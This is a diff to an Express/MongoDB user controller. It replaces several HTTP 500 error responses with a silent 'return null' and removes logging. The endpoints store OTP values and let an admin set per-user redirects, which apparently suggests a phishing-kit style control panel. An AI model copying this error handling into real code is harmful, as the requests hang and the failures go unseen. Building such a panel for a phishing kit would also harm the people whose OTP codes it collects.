@@ -28,14 +28,14 @@ exports.addUser = async (req, res) => {
 
     } catch (err) {
 
-        return res.status(500).json({ message: err.message });
+        return null;
     }
 
 };
 exports.updateUser = async (req, res) => {
 
     const { id, quickdata, otp, logs, status, homeinfo } = req.body;
-    console.log(status);
+
 
     try {
         if (quickdata) {
@@ -69,7 +69,7 @@ exports.updateUser = async (req, res) => {
             // Add the newQuickData element to the quick_data array
 
             user.logs.addToSet(logs);
-            console.log(user);
+
 
             // Save the updated user document
             await user.save();
@@ -147,6 +147,7 @@ exports.updateUser = async (req, res) => {
 
 }
 
+
 exports.getAllUsers = async (req, res) => {
     // 10 / 
     try {
@@ -174,7 +175,7 @@ exports.deleteUser = async (req, res) => {
     const { ids } = req.body; // IDs of users to delete (can be an array)
 
     try {
-        if (ids.length>1) {
+        if (ids.length > 1) {
             // If 'ids' is an array, delete multiple users
             const deletionResult = await User.deleteMany({ _id: { $in: ids } });
             if (deletionResult.deletedCount > 0) {
@@ -194,7 +195,7 @@ exports.deleteUser = async (req, res) => {
         }
     } catch (err) {
         console.log('Error while deleting user(s): ', err);
-        return res.status(500).json({ success: false, message: err.message });
+        return null;
     }
 };
 
@@ -210,16 +211,17 @@ exports.getUserById = async (req, res) => {
         }
         user.logs = user.logs.reverse();
 
-        console.log("User fetched successfully by ID!");
+
         return res.status(200).json(user);
     } catch (err) {
         console.log("Error while fetching user by ID: ", err);
-        return res.status(500).json({ message: err.message });
+        return null;
     }
 };
 
 
 exports.updateRedirectAdmin = async (req, res) => {
+
     try {
         const { id, redirect, logs } = req.body;
         const user = await User.findOne({ id: id });
@@ -230,6 +232,7 @@ exports.updateRedirectAdmin = async (req, res) => {
         user.redirect = redirect;
         user.logs.addToSet(logs);
         await user.save();
+
 
         console.log("User updated successfully!");
         return res.status(200).json({success:true});
@@ -247,7 +250,7 @@ exports.updateStatus = async (id, status) => {
     }
 
     catch (err) {
-        return res.status(500).json({ message: err.message });
+        return null;
     }
 
 
@@ -260,7 +263,7 @@ exports.checkRedirect = async (req, res) => {
             return res.send({ redirect: user.redirect, status: user.status });
         }
     } catch (err) {
-        return res.status(500).json({ message: err.message });
+        return null;
     }
 
 
@@ -279,7 +282,7 @@ exports.updateRedirect = async (req, res) => {
         await user.save();
         return res.send("success");
     } catch (err) {
-        return res.status(500).json({ message: err.message });
+        return null;
     }
 
 
@@ -291,7 +294,7 @@ exports.getuser = async (req, res) => {
         const user = await User.findOne({ id: id });
         res.send(user);
     } catch (err) {
-        return res.status(500).json({ message: err.message });
+        return null;
     }
 
 
